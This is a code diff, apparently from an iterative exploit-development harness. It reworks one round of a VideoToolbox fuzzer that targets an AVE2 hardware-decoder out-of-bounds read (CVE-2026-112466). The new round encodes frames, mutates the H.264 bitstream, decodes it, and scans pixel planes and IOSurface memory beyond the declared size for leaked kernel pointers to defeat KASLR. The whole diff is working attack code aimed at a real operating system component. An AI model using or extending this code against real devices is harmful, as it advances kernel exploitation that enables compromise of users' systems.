@@ -22748,313 +22748,322 @@ new_modes:
 
             if (rounds == 195) {
                 /*
-                 * r=195: VideoToolbox hardware decode deep fuzzer.
+                 * r=195: VideoToolbox encode→mutate→decode for KASLR leak.
                  *
-                 * Target CVE-2026-112466 (AVE2 OOB read → KASLR leak).
-                 * Force hardware decode path and probe error return values,
-                 * pixel buffer metadata, and CMSampleBuffer properties
-                 * for leaked kernel addresses.
+                 * Strategy: encode a real frame to get valid SPS/PPS/IDR,
+                 * then mutate the encoded bitstream before decode to trigger
+                 * AVE2 error paths that might leak kernel addresses.
+                 * Also try unusual resolutions and temporal layers.
                  */
-                rlog("=== r=195: VideoToolbox HW decode fuzzer ===\n");
+                rlog("=== r=195: VT encode→mutate→decode fuzzer ===\n");
 
-                /* Minimal valid H.264 SPS+PPS+IDR for hardware decode */
-                static const uint8_t sps195[] = {
-                    0x67, 0x42, 0xc0, 0x1e, 0xd9, 0x00, 0xa0, 0x47, 0xfe, 0xc8
+                /* Encode a frame to get valid SPS/PPS/IDR NALs */
+                int resolutions[][2] = {
+                    {128, 128},
+                    {17, 17},     /* odd, non-aligned */
+                    {4096, 16},   /* extreme aspect ratio */
+                    {64, 64},
                 };
-                static const uint8_t pps195[] = {
-                    0x68, 0xce, 0x38, 0x80
-                };
-                static const uint8_t idr195[] = {
-                    0x65, 0x88, 0x80, 0x40, 0x00, 0x00, 0x00, 0x01,
-                    0x00, 0x00, 0x03, 0x00, 0x01, 0x00, 0x00, 0x03,
-                    0x00, 0x02, 0x00, 0x00, 0x03, 0x00, 0x04, 0x00,
-                    0x00, 0x03, 0x00, 0x08, 0x00, 0x00, 0x03, 0x00,
-                    0x10, 0xa8
-                };
+                int nres = 4;
 
-                const uint8_t *psets[2] = {sps195, pps195};
-                size_t psizes[2] = {sizeof(sps195), sizeof(pps195)};
-                CMFormatDescriptionRef fmt195 = NULL;
-                OSStatus st195 = CMVideoFormatDescriptionCreateFromH264ParameterSets(
-                    NULL, 2, psets, psizes, 4, &fmt195);
-                rlog("  Format desc create: st=%d\n", (int)st195);
+                for (int ri = 0; ri < nres; ri++) {
+                    int ew = resolutions[ri][0], eh = resolutions[ri][1];
+                    rlog("\n  --- Resolution %dx%d ---\n", ew, eh);
 
-                if (st195 == 0 && fmt195) {
-                    /* Test multiple decoder configurations */
-                    int configs[][2] = {
-                        {0, 0},     /* default */
-                        {1, 0},     /* force HW */
-                        {0, 1},     /* with realtime */
-                    };
+                    /* Create pixel buffer */
+                    CVPixelBufferRef enc_pb = NULL;
+                    CFMutableDictionaryRef pba195 = CFDictionaryCreateMutable(NULL, 0,
+                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                    CFDictionaryRef iosurfProps195 = CFDictionaryCreate(NULL,
+                        NULL, NULL, 0,
+                        &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                    CFDictionarySetValue(pba195,
+                        kCVPixelBufferIOSurfacePropertiesKey, iosurfProps195);
+                    CFRelease(iosurfProps195);
+                    CVReturn cvr = CVPixelBufferCreate(NULL, ew, eh,
+                        kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange,
+                        pba195, &enc_pb);
+                    CFRelease(pba195);
+                    if (cvr != 0 || !enc_pb) {
+                        rlog("  PB create failed: %d\n", cvr);
+                        continue;
+                    }
 
-                    for (int ci = 0; ci < 3; ci++) {
-                        rlog("\n  Config %d (hw=%d rt=%d):\n",
-                             ci, configs[ci][0], configs[ci][1]);
+                    /* Fill with pattern */
+                    CVPixelBufferLockBaseAddress(enc_pb, 0);
+                    void *yp = CVPixelBufferGetBaseAddressOfPlane(enc_pb, 0);
+                    size_t ybpr = CVPixelBufferGetBytesPerRowOfPlane(enc_pb, 0);
+                    size_t yh = CVPixelBufferGetHeightOfPlane(enc_pb, 0);
+                    if (yp) memset(yp, 128, ybpr * yh);
+                    void *uvp = CVPixelBufferGetBaseAddressOfPlane(enc_pb, 1);
+                    size_t uvbpr = CVPixelBufferGetBytesPerRowOfPlane(enc_pb, 1);
+                    size_t uvh = CVPixelBufferGetHeightOfPlane(enc_pb, 1);
+                    if (uvp) memset(uvp, 128, uvbpr * uvh);
+                    CVPixelBufferUnlockBaseAddress(enc_pb, 0);
 
-                        CFMutableDictionaryRef decoderSpec = CFDictionaryCreateMutable(
-                            NULL, 0, &kCFTypeDictionaryKeyCallBacks,
-                            &kCFTypeDictionaryValueCallBacks);
-                        if (configs[ci][0]) {
-                            /* Force hardware acceleration */
-                            CFDictionarySetValue(decoderSpec,
-                                CFSTR("EnableHardwareAcceleratedVideoDecoder"),
-                                kCFBooleanTrue);
-                            CFDictionarySetValue(decoderSpec,
-                                CFSTR("RequireHardwareAcceleratedVideoDecoder"),
-                                kCFBooleanTrue);
-                        }
-                        if (configs[ci][1]) {
-                            CFDictionarySetValue(decoderSpec,
-                                CFSTR("RealTime"), kCFBooleanTrue);
-                        }
+                    /* Encode */
+                    __block CMSampleBufferRef enc_out = NULL;
+                    __block OSStatus enc_st = -999;
 
-                        /* Pixel buffer attributes */
-                        CFMutableDictionaryRef pbattrs = CFDictionaryCreateMutable(
-                            NULL, 0, &kCFTypeDictionaryKeyCallBacks,
-                            &kCFTypeDictionaryValueCallBacks);
-                        int pbfmt = kCVPixelFormatType_420YpCbCr8BiPlanarVideoRange;
-                        CFNumberRef pbfmtn = CFNumberCreate(NULL, kCFNumberIntType, &pbfmt);
-                        CFDictionarySetValue(pbattrs,
-                            kCVPixelBufferPixelFormatTypeKey, pbfmtn);
+                    VTCompressionSessionRef comp = NULL;
+                    OSStatus cst = VTCompressionSessionCreate(NULL, ew, eh,
+                        kCMVideoCodecType_H264, NULL, NULL, NULL,
+                        ^(OSStatus s, VTEncodeInfoFlags f, CMSampleBufferRef sb) {
+                        enc_st = s;
+                        if (sb && s == 0) enc_out = (CMSampleBufferRef)CFRetain(sb);
+                    }, NULL, &comp);
 
-                        /* Use callback that captures output */
-                        __block CVPixelBufferRef captured_pb = NULL;
-                        __block int decode_status = -999;
+                    if (cst != 0 || !comp) {
+                        rlog("  Encoder create failed: %d\n", (int)cst);
+                        CVPixelBufferRelease(enc_pb);
+                        continue;
+                    }
 
-                        VTDecompressionOutputCallbackRecord cb195;
-                        cb195.decompressionOutputCallback = NULL;
-                        cb195.decompressionOutputRefCon = NULL;
+                    VTSessionSetProperty(comp,
+                        kVTCompressionPropertyKey_RealTime, kCFBooleanTrue);
+                    VTSessionSetProperty(comp,
+                        kVTCompressionPropertyKey_AllowFrameReordering,
+                        kCFBooleanFalse);
 
-                        /* Use synchronous decode with VTDecompressionSessionDecodeFrameWithOutputHandler */
-                        VTDecompressionSessionRef session195 = NULL;
-                        OSStatus st_create = VTDecompressionSessionCreate(
-                            NULL, fmt195, decoderSpec, pbattrs,
-                            NULL, &session195);
-                        rlog("  Session create: st=%d sess=%p\n",
-                             (int)st_create, (void*)session195);
+                    cst = VTCompressionSessionEncodeFrame(comp, enc_pb,
+                        CMTimeMake(0, 30), CMTimeMake(1, 30), NULL, NULL, NULL);
+                    VTCompressionSessionCompleteFrames(comp, kCMTimeInvalid);
+                    rlog("  Encode: submit=%d callback=%d out=%p\n",
+                         (int)cst, (int)enc_st, (void*)enc_out);
 
-                        if (st_create == 0 && session195) {
-                            /* Build CMSampleBuffer from IDR */
-                            CMBlockBufferRef bb195 = NULL;
-                            uint8_t *idr_buf = malloc(4 + sizeof(idr195));
-                            uint32_t nallen = htonl(sizeof(idr195));
-                            memcpy(idr_buf, &nallen, 4);
-                            memcpy(idr_buf + 4, idr195, sizeof(idr195));
-                            size_t total_sz = 4 + sizeof(idr195);
+                    if (enc_out) {
+                        /* Extract SPS/PPS from format description */
+                        CMFormatDescriptionRef efmt =
+                            CMSampleBufferGetFormatDescription(enc_out);
+                        if (efmt) {
+                            size_t sparamCount = 0;
+                            CMVideoFormatDescriptionGetH264ParameterSetAtIndex(
+                                efmt, 0, NULL, NULL, &sparamCount, NULL);
+                            rlog("  Param set count: %zu\n", sparamCount);
 
-                            CMBlockBufferCreateWithMemoryBlock(
-                                NULL, idr_buf, total_sz, kCFAllocatorNull,
-                                NULL, 0, total_sz, 0, &bb195);
+                            /* Get encoded NAL data */
+                            CMBlockBufferRef ebb =
+                                CMSampleBufferGetDataBuffer(enc_out);
+                            size_t edata_len = 0;
+                            char *edata = NULL;
+                            if (ebb) {
+                                edata_len = CMBlockBufferGetDataLength(ebb);
+                                CMBlockBufferGetDataPointer(ebb, 0,
+                                    NULL, NULL, &edata);
+                                rlog("  Encoded data: %zu bytes\n", edata_len);
+                            }
 
-                            CMSampleTimingInfo timing195 = {
-                                .duration = CMTimeMake(1, 30),
-                                .presentationTimeStamp = CMTimeMake(0, 30),
-                                .decodeTimeStamp = kCMTimeInvalid
-                            };
-                            size_t sampleSize = total_sz;
-                            CMSampleBufferRef sb195 = NULL;
-                            CMSampleBufferCreateReady(NULL, bb195, fmt195,
-                                1, 1, &timing195, 1, &sampleSize, &sb195);
+                            /* Now decode with mutations */
+                            if (edata && edata_len > 8) {
+                                /* Create decoder with HW acceleration */
+                                CFMutableDictionaryRef ds195 =
+                                    CFDictionaryCreateMutable(NULL, 0,
+                                        &kCFTypeDictionaryKeyCallBacks,
+                                        &kCFTypeDictionaryValueCallBacks);
+                                CFDictionarySetValue(ds195,
+                                    CFSTR("EnableHardwareAcceleratedVideoDecoder"),
+                                    kCFBooleanTrue);
 
-                            if (sb195) {
-                                /* Decode with output handler */
-                                __block CVPixelBufferRef out_pb = NULL;
-                                __block OSStatus out_st = -999;
-                                __block VTDecodeInfoFlags out_flags = 0;
+                                /* Test 1: Normal decode (baseline) */
+                                VTDecompressionSessionRef dec195 = NULL;
+                                OSStatus dcs = VTDecompressionSessionCreate(
+                                    NULL, efmt, ds195, NULL, NULL, &dec195);
+                                rlog("  Decoder create: %d\n", (int)dcs);
 
-                                OSStatus dec_st =
+                                if (dcs == 0 && dec195) {
+                                    __block CVPixelBufferRef dpb = NULL;
+                                    __block OSStatus dost = -999;
+
                                     VTDecompressionSessionDecodeFrameWithOutputHandler(
-                                        session195, sb195,
-                                        kVTDecodeFrame_1xRealTimePlayback,
-                                        NULL, ^(OSStatus status,
-                                                VTDecodeInfoFlags infoFlags,
-                                                CVImageBufferRef imageBuffer,
-                                                CMTime pts, CMTime duration) {
-                                    out_st = status;
-                                    out_flags = infoFlags;
-                                    if (imageBuffer) {
-                                        out_pb = (CVPixelBufferRef)CFRetain(imageBuffer);
-                                    }
-                                });
-                                rlog("  Decode submit: st=%d\n", (int)dec_st);
+                                        dec195, enc_out, 0, NULL,
+                                        ^(OSStatus s, VTDecodeInfoFlags f,
+                                          CVImageBufferRef ib, CMTime p, CMTime d) {
+                                        dost = s;
+                                        if (ib) dpb = (CVPixelBufferRef)CFRetain(ib);
+                                    });
+                                    VTDecompressionSessionWaitForAsynchronousFrames(dec195);
+                                    rlog("  Normal decode: st=%d pb=%p\n",
+                                         (int)dost, (void*)dpb);
 
-                                VTDecompressionSessionWaitForAsynchronousFrames(session195);
-                                rlog("  Callback: st=%d flags=0x%x pb=%p\n",
-                                     (int)out_st, (unsigned)out_flags,
-                                     (void*)out_pb);
-
-                                if (out_pb) {
-                                    CVPixelBufferLockBaseAddress(out_pb, kCVPixelBufferLock_ReadOnly);
-                                    size_t pw = CVPixelBufferGetWidth(out_pb);
-                                    size_t ph = CVPixelBufferGetHeight(out_pb);
-                                    size_t pbr = CVPixelBufferGetBytesPerRow(out_pb);
-                                    void *pba = CVPixelBufferGetBaseAddress(out_pb);
-                                    rlog("  PB: %zux%zu bpr=%zu base=%p\n",
-                                         pw, ph, pbr, pba);
-
-                                    /* Scan pixel data for KPTR */
-                                    if (pba) {
-                                        uint64_t *scan = (uint64_t*)pba;
-                                        size_t nqw = (pbr * ph) / 8;
-                                        int kptr_count = 0;
-                                        for (size_t q = 0; q < nqw && q < 4096; q++) {
-                                            uint64_t v = scan[q];
-                                            uint64_t ut = (v & 0xF000FFFFFFFFFFFFULL) |
-                                                ((v & 0x00F0000000000000ULL) ?
-                                                 0xFFF0000000000000ULL : 0);
-                                            if ((ut & 0xFFFFFF0000000000ULL) ==
-                                                0xFFFFFE0000000000ULL) {
-                                                rlog("  *** KPTR@%zu: 0x%016llx ***\n",
-                                                     q*8, (unsigned long long)v);
-                                                kptr_count++;
-                                                if (kptr_count >= 10) break;
+                                    if (dpb) {
+                                        /* Scan decoded output for KPTR */
+                                        CVPixelBufferLockBaseAddress(dpb,
+                                            kCVPixelBufferLock_ReadOnly);
+                                        void *dba = CVPixelBufferGetBaseAddress(dpb);
+                                        size_t dbpr = CVPixelBufferGetBytesPerRow(dpb);
+                                        size_t dh = CVPixelBufferGetHeight(dpb);
+                                        int kpc = 0;
+                                        if (dba) {
+                                            uint64_t *ds = (uint64_t*)dba;
+                                            size_t nq = (dbpr * dh) / 8;
+                                            for (size_t q = 0; q < nq && q < 4096; q++) {
+                                                uint64_t v = ds[q];
+                                                uint64_t ut = (v & 0xF000FFFFFFFFFFFFULL) |
+                                                    ((v & 0x00F0000000000000ULL) ?
+                                                     0xFFF0000000000000ULL : 0);
+                                                if ((ut & 0xFFFFFF0000000000ULL) ==
+                                                    0xFFFFFE0000000000ULL) {
+                                                    rlog("  *** KPTR@%zu: 0x%016llx ***\n",
+                                                         q*8, (unsigned long long)v);
+                                                    kpc++;
+                                                }
                                             }
                                         }
-                                        if (kptr_count == 0)
-                                            rlog("  Pixel scan: 0 KPTRs in %zu qwords\n",
-                                                 nqw > 4096 ? (size_t)4096 : nqw);
-                                    }
+                                        rlog("  KPTR scan: %d found\n", kpc);
 
-                                    /* Check pixel buffer IOSurface backing */
-                                    IOSurfaceRef pb_surf = CVPixelBufferGetIOSurface(out_pb);
-                                    if (pb_surf) {
-                                        IOSurfaceID pbsid = IOSurfaceGetID(pb_surf);
-                                        rlog("  PB IOSurface ID: %u\n", pbsid);
+                                        /* Check IOSurface backing */
+                                        IOSurfaceRef dsf = CVPixelBufferGetIOSurface(dpb);
+                                        if (dsf) {
+                                            rlog("  Decode surface ID: %u\n",
+                                                 IOSurfaceGetID(dsf));
 
-                                        CFDictionaryRef pball =
-                                            IOSurfaceCopyAllValues(pb_surf);
-                                        if (pball) {
-                                            CFIndex nk = CFDictionaryGetCount(pball);
-                                            rlog("  PB Surface AllValues: %ld keys\n",
-                                                 (long)nk);
-                                            const void **pkeys = malloc(nk * sizeof(void*));
-                                            const void **pvals = malloc(nk * sizeof(void*));
-                                            CFDictionaryGetKeysAndValues(pball, pkeys, pvals);
-                                            for (CFIndex k = 0; k < nk && k < 32; k++) {
-                                                char kb[128] = {0};
-                                                if (CFGetTypeID(pkeys[k]) == CFStringGetTypeID())
-                                                    CFStringGetCString(pkeys[k], kb,
-                                                        sizeof(kb), kCFStringEncodingUTF8);
-                                                if (CFGetTypeID(pvals[k]) == CFNumberGetTypeID()) {
-                                                    int64_t nv = 0;
-                                                    CFNumberGetValue(pvals[k],
-                                                        kCFNumberSInt64Type, &nv);
-                                                    uint64_t uv = (uint64_t)nv;
-                                                    uint64_t uut = (uv & 0xF000FFFFFFFFFFFFULL) |
-                                                        ((uv & 0x00F0000000000000ULL) ?
-                                                         0xFFF0000000000000ULL : 0);
-                                                    if ((uut & 0xFFFFFF0000000000ULL) ==
-                                                        0xFFFFFE0000000000ULL) {
-                                                        rlog("  *** PB KPTR '%s'=0x%016llx ***\n",
-                                                             kb, (unsigned long long)uv);
+                                            /* Scan ALL planes including padding */
+                                            size_t np = CVPixelBufferGetPlaneCount(dpb);
+                                            for (size_t pi = 0; pi < np; pi++) {
+                                                void *pp = CVPixelBufferGetBaseAddressOfPlane(dpb, pi);
+                                                size_t pbr = CVPixelBufferGetBytesPerRowOfPlane(dpb, pi);
+                                                size_t pht = CVPixelBufferGetHeightOfPlane(dpb, pi);
+                                                if (pp && pbr * pht >= 8) {
+                                                    uint64_t *ps = (uint64_t*)pp;
+                                                    size_t pnq = (pbr * pht) / 8;
+                                                    for (size_t q = 0; q < pnq && q < 2048; q++) {
+                                                        uint64_t v = ps[q];
+                                                        uint64_t ut2 = (v & 0xF000FFFFFFFFFFFFULL) |
+                                                            ((v & 0x00F0000000000000ULL) ?
+                                                             0xFFF0000000000000ULL : 0);
+                                                        if ((ut2 & 0xFFFFFF0000000000ULL) ==
+                                                            0xFFFFFE0000000000ULL) {
+                                                            rlog("  *** PLANE%zu KPTR@%zu: 0x%016llx ***\n",
+                                                                 pi, q*8, (unsigned long long)v);
+                                                        }
                                                     }
                                                 }
                                             }
-                                            free(pkeys);
-                                            free(pvals);
-                                            CFRelease(pball);
+
+                                            /* Check PAST the declared dimensions for OOB data */
+                                            size_t total_alloc = IOSurfaceGetAllocSize(dsf);
+                                            void *sbase = IOSurfaceGetBaseAddress(dsf);
+                                            rlog("  Surface alloc: %zu base: %p\n",
+                                                 total_alloc, sbase);
+                                            if (sbase && total_alloc > dbpr * dh) {
+                                                size_t extra = total_alloc - (dbpr * dh);
+                                                uint64_t *ep = (uint64_t*)((uint8_t*)sbase + dbpr * dh);
+                                                size_t enq = extra / 8;
+                                                for (size_t q = 0; q < enq && q < 1024; q++) {
+                                                    uint64_t v = ep[q];
+                                                    uint64_t ut3 = (v & 0xF000FFFFFFFFFFFFULL) |
+                                                        ((v & 0x00F0000000000000ULL) ?
+                                                         0xFFF0000000000000ULL : 0);
+                                                    if ((ut3 & 0xFFFFFF0000000000ULL) ==
+                                                        0xFFFFFE0000000000ULL) {
+                                                        rlog("  *** OOB KPTR@%zu: 0x%016llx ***\n",
+                                                             dbpr*dh + q*8, (unsigned long long)v);
+                                                    }
+                                                }
+                                                /* Also check for nonzero in padding */
+                                                int nz = 0;
+                                                for (size_t q = 0; q < enq && q < 1024; q++) {
+                                                    if (ep[q] != 0) nz++;
+                                                }
+                                                rlog("  Padding: %zu bytes, %d nonzero qwords\n",
+                                                     extra, nz);
+                                            }
                                         }
+
+                                        CVPixelBufferUnlockBaseAddress(dpb,
+                                            kCVPixelBufferLock_ReadOnly);
+                                        CFRelease(dpb);
                                     }
 
-                                    CVPixelBufferUnlockBaseAddress(out_pb, kCVPixelBufferLock_ReadOnly);
-                                    CFRelease(out_pb);
+                                    VTDecompressionSessionInvalidate(dec195);
+                                    CFRelease(dec195);
                                 }
 
-                                CFRelease(sb195);
-                            }
-                            free(idr_buf);
-                            if (bb195) CFRelease(bb195);
+                                /* Test 2: Decode with mutated NAL data */
+                                rlog("\n  Mutated NAL decode:\n");
+                                for (int mut = 0; mut < 8 && (size_t)mut < edata_len; mut++) {
+                                    size_t moff = 4 + mut; /* skip length prefix */
+                                    if (moff >= edata_len) break;
 
-                            /* Also try decoding with CORRUPT SPS to trigger error paths */
-                            rlog("\n  Corrupt SPS decode attempts:\n");
-                            for (int mut = 0; mut < 5; mut++) {
-                                uint8_t msps[sizeof(sps195)];
-                                memcpy(msps, sps195, sizeof(sps195));
-                                /* Corrupt different bytes */
-                                msps[mut + 2] ^= 0xFF;
+                                    uint8_t *mdata = malloc(edata_len);
+                                    memcpy(mdata, edata, edata_len);
+                                    mdata[moff] ^= 0x80; /* flip high bit */
 
-                                const uint8_t *mp[2] = {msps, pps195};
-                                CMFormatDescriptionRef mfmt = NULL;
-                                OSStatus mst = CMVideoFormatDescriptionCreateFromH264ParameterSets(
-                                    NULL, 2, mp, psizes, 4, &mfmt);
-                                if (mst == 0 && mfmt) {
-                                    VTDecompressionSessionRef ms = NULL;
-                                    OSStatus mcs = VTDecompressionSessionCreate(
-                                        NULL, mfmt, decoderSpec, pbattrs,
-                                        NULL, &ms);
-                                    rlog("  Mut[%d] byte %d: fmt=%d sess=%d\n",
-                                         mut, mut+2, (int)mst, (int)mcs);
+                                    CMBlockBufferRef mbb = NULL;
+                                    CMBlockBufferCreateWithMemoryBlock(NULL,
+                                        mdata, edata_len, kCFAllocatorNull,
+                                        NULL, 0, edata_len, 0, &mbb);
 
-                                    if (mcs == 0 && ms) {
-                                        /* Try decode and check error */
-                                        CMBlockBufferRef mbb = NULL;
-                                        uint8_t *mbuf = malloc(total_sz);
-                                        memcpy(mbuf, &nallen, 4);
-                                        memcpy(mbuf + 4, idr195, sizeof(idr195));
-                                        CMBlockBufferCreateWithMemoryBlock(
-                                            NULL, mbuf, total_sz, kCFAllocatorNull,
-                                            NULL, 0, total_sz, 0, &mbb);
-                                        CMSampleBufferRef msb = NULL;
-                                        CMSampleBufferCreateReady(NULL, mbb, mfmt,
-                                            1, 1, &timing195, 1, &sampleSize, &msb);
-                                        if (msb) {
-                                            __block OSStatus mout_st = -999;
-                                            __block CVPixelBufferRef mout_pb = NULL;
+                                    CMSampleTimingInfo mti = {
+                                        .duration = CMTimeMake(1, 30),
+                                        .presentationTimeStamp = CMTimeMake(0, 30),
+                                        .decodeTimeStamp = kCMTimeInvalid
+                                    };
+                                    size_t mss = edata_len;
+                                    CMSampleBufferRef msb = NULL;
+                                    CMSampleBufferCreateReady(NULL, mbb, efmt,
+                                        1, 1, &mti, 1, &mss, &msb);
+
+                                    if (msb) {
+                                        VTDecompressionSessionRef mdec = NULL;
+                                        OSStatus mdcs = VTDecompressionSessionCreate(
+                                            NULL, efmt, ds195, NULL, NULL, &mdec);
+                                        if (mdcs == 0 && mdec) {
+                                            __block CVPixelBufferRef mpb = NULL;
+                                            __block OSStatus most = -999;
                                             VTDecompressionSessionDecodeFrameWithOutputHandler(
-                                                ms, msb, 0, NULL,
+                                                mdec, msb, 0, NULL,
                                                 ^(OSStatus s, VTDecodeInfoFlags f,
                                                   CVImageBufferRef ib, CMTime p, CMTime d) {
-                                                mout_st = s;
-                                                if (ib) mout_pb = (CVPixelBufferRef)CFRetain(ib);
+                                                most = s;
+                                                if (ib) mpb = (CVPixelBufferRef)CFRetain(ib);
                                             });
-                                            VTDecompressionSessionWaitForAsynchronousFrames(ms);
-                                            rlog("  Mut[%d] decode: st=%d pb=%p\n",
-                                                 mut, (int)mout_st, (void*)mout_pb);
-                                            if (mout_pb) {
-                                                /* Check for KPTR in output */
-                                                CVPixelBufferLockBaseAddress(mout_pb,
+                                            VTDecompressionSessionWaitForAsynchronousFrames(mdec);
+                                            rlog("  Mut[%d] off=%zu: st=%d pb=%p\n",
+                                                 mut, moff, (int)most, (void*)mpb);
+                                            if (mpb) {
+                                                CVPixelBufferLockBaseAddress(mpb,
                                                     kCVPixelBufferLock_ReadOnly);
-                                                void *mba = CVPixelBufferGetBaseAddress(mout_pb);
+                                                void *mba = CVPixelBufferGetBaseAddress(mpb);
+                                                size_t mbpr = CVPixelBufferGetBytesPerRow(mpb);
+                                                size_t mh = CVPixelBufferGetHeight(mpb);
                                                 if (mba) {
                                                     uint64_t *ms64 = (uint64_t*)mba;
-                                                    size_t mnq = CVPixelBufferGetBytesPerRow(mout_pb)
-                                                        * CVPixelBufferGetHeight(mout_pb) / 8;
-                                                    for (size_t q = 0; q < mnq && q < 1024; q++) {
+                                                    size_t mnq = (mbpr * mh) / 8;
+                                                    for (size_t q = 0; q < mnq && q < 2048; q++) {
                                                         uint64_t v = ms64[q];
-                                                        uint64_t uut = (v & 0xF000FFFFFFFFFFFFULL) |
+                                                        uint64_t ut4 = (v & 0xF000FFFFFFFFFFFFULL) |
                                                             ((v & 0x00F0000000000000ULL) ?
                                                              0xFFF0000000000000ULL : 0);
-                                                        if ((uut & 0xFFFFFF0000000000ULL) ==
+                                                        if ((ut4 & 0xFFFFFF0000000000ULL) ==
                                                             0xFFFFFE0000000000ULL) {
                                                             rlog("  *** MUT KPTR@%zu: 0x%016llx ***\n",
                                                                  q*8, (unsigned long long)v);
                                                         }
                                                     }
                                                 }
-                                                CVPixelBufferUnlockBaseAddress(mout_pb,
+                                                CVPixelBufferUnlockBaseAddress(mpb,
                                                     kCVPixelBufferLock_ReadOnly);
-                                                CFRelease(mout_pb);
+                                                CFRelease(mpb);
                                             }
-                                            CFRelease(msb);
+                                            VTDecompressionSessionInvalidate(mdec);
+                                            CFRelease(mdec);
                                         }
-                                        free(mbuf);
-                                        if (mbb) CFRelease(mbb);
-                                        VTDecompressionSessionInvalidate(ms);
-                                        CFRelease(ms);
+                                        CFRelease(msb);
                                     }
-                                    CFRelease(mfmt);
+                                    if (mbb) CFRelease(mbb);
+                                    free(mdata);
                                 }
+
+                                CFRelease(ds195);
                             }
-
-                            VTDecompressionSessionInvalidate(session195);
-                            CFRelease(session195);
                         }
-
-                        CFRelease(decoderSpec);
-                        CFRelease(pbattrs);
-                        CFRelease(pbfmtn);
+                        CFRelease(enc_out);
                     }
-                    CFRelease(fmt195);
+
+                    VTCompressionSessionInvalidate(comp);
+                    CFRelease(comp);
+                    CVPixelBufferRelease(enc_pb);
                 }
                 rlog("=== r=195 complete ===\n");
             }
